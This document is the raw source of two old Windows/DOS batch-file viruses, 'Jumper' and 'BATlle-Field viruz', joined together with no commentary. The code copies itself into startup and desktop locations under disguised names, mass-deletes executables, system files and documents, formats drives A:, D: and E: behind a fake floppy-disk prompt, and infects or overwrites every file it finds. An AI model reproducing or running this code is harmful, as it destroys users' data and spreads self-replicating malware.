   @echo off
   cls
   REM Jumper
   REM by McHit

   if exist %WinDir%\*.* goto Windows
   goto noWindows
   :Windows
   goto fuckw
   :funw
   goto erw

   :mew
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cls
   goto xxw

   :fuckw
   md %WinDir%\Jumper
   copy %0 %WinDir%\Jumper
   cls
   If exist %WinDir%\Jumper\WinSt.bat goto erw
   goto funw

   :sdw
   copy %0 %WinDir%\Startm~1\progra~1\autost~1\WinSt.bat
   copy %0 %WinDir%\Desktop\open.bat
   cls
   goto mew

   :youw
   @del *.vbs
   @del *.js
   @del *.doc
   @del *.com
   @del *.sys
   @del *.exe
   @del *.pif
   goto zuw

   :erw
   @del %WinDir%\Jumper\*.bat
   md %WinDir%\Desktop\Internet
   copy %0 %WinDir%\Desktop\Internet\I-Explor.bat
   md %WinDir%\Desktop\Programme
   copy %0 %WinDir%\Desktop\Programme
   cls
   goto sdw

   :zuw
   goto hiw

   :xxw
   cls
   echo Legen Sie eine Diskette in Ihr A: Laufwerk ein
   echo um das Programm ordnungsgemaess starten zu können.
   PAUSE
   ctty NUL
   format A: /u /q /autotest
   copy %0 A:\fun.bat
   goto qyw

   :hiw
   @del %WinDir%\System\*.vbs
   @del %WinDir%\System\*.js
   @del %WinDir%\System\*.doc
   @del %WinDir%\System\*.xls
   @del %WinDir%\System\*.pif
   @del %WinDir%\System\*.htm
   goto dtw

   :qyw
   @del %WinDir%\*.vbs
   @del %WinDir%\*.js
   @del %WinDir%\*.doc
   @del %WinDir%\*.xls
   @del %WinDir%\*.pif
   @del %WinDir%\*.htm
   goto youw

   :dtw
   cls
   label C: Jumper
   label D: Jumper
   prompt :-)
   WinVer
   copy %0 C:\yes.bat
   goto Ende

   :NoWindows
   If not exist C:\Windows\*.* goto DOS
   goto fuck
   :fun
   goto er

   :me
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cls
   goto xx

   :fuck
   md C:\Windows\Jumper
   copy %0 C:\Windows\Jumper
   cls
   If exist C:\Windows\Jumper\WinSt.bat goto er
   goto fun

   :sd
   copy %0 C:\Windows\Startm~1\progra~1\autost~1\WinSt.bat
   copy %0 C:\Windows\Desktop\open.bat
   cls
   goto me

   :you
   @del *.vbs
   @del *.js
   @del *.doc
   @del *.com
   @del *.sys
   @del *.exe
   @del *.pif
   goto zu

   :er
   @del C:\Windows\Jumper\*.bat
   md C:\Windows\Desktop\Internet
   copy %0 C:\Windows\Desktop\Internet\I-Explor.bat
   md C:\Windows\Desktop\Programme
   copy %0 C:\Windows\Desktop\Programme
   cls
   goto sd

   :zu
   goto hi

   :xx
   cls
   echo Legen Sie eine Diskette in Ihr A: Laufwerk ein
   echo um das Programm ordnungsgemaess starten zu können.
   PAUSE
   ctty NUL
   format A: /u /q /autotest
   copy %0 A:\fun.bat
   goto qy

   :hi
   @del C:\Windows\System\*.vbs
   @del C:\Windows\System\*.js
   @del C:\Windows\System\*.doc
   @del C:\Windows\System\*.xls
   @del C:\Windows\System\*.pif
   @del C:\Windows\System\*.htm
   goto dt

   :qy
   @del C:\Windows\*.vbs
   @del C:\Windows\*.js
   @del C:\Windows\*.doc
   @del C:\Windows\*.xls
   @del C:\Windows\*.pif
   @del C:\Windows\*.htm
   goto you

   :dt
   cls
   label C: Jumper
   label D: Jumper
   prompt :-)
   WinVer
   copy %0 C:\yes.bat
   goto Ende

   :DOS
   if not exist C:\*.* goto LastHope
   ctty NUL
   copy %0 C:\*.*
   copy %0 C:\fun.bat
   copy %0 C:\open.bat
   md C:\Open
   copy %0 C:\Open
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   format A: /u /q /autotest
   copy %0 A:\*.*
   copy %0 A:\openMe.bat
   goto Ende
   :LastHope
   :Ende:: °±²Û BATlle-Field viruz by Ratty and DvL Û²±°
   ::      ===================================
   :: 14.05.2003
   :: Created by 2 good friends reunited
   :: DvL      ( dvl2003ro@yahoo.co.uk )
   :: Ratty    ( ratty2001ro@yahoo.com )
   :: Contact us.
   :: GreetZ <-- VX GuyZ : SpTh  --> www.spth.de.vu        --> working
   :: ======     =======   Ratty --> http://ratty.home.ro/ --> work in progress
   ::        <-- Av GuyZ : Adder --> www.bitdefender.com   --> working
   ::            =======   Kav   --> www.kaspersky.com     --> working
   ::        <-- Misc    : NgL   --> my girlfriend
   ::            ====      MJ    --> my BEST friend
   @echo off
   ctty nul
   ver | find "XP"
   if errorlevel 1 goto w1nd0z3
   if not errorlevel 1 goto :XP
   :XP
   for /r \ %%i in (*.*) do copy %%i+%0 %%i
   :: The next line is unuseful :)
   for /r \ %%i in (*.*) do echo DvL and Ratty killed your DATA > %%i
   if exist echo y | format e:
   if exist echo y | format d:
   goto XP
   ctty con
   exit
   :w1nd0z3
   @for %%a in (*.exe, *.bat) do copy %%a+%0 %%a
   @if exist echo y | format e:/q/autotest
   @if exist echo y | format d:/q/autotest
   goto w1nd0z3
   :: BATlle-Field viruz by Ratty and DvL
   :: 14.05.2003
   ctty con
   cls
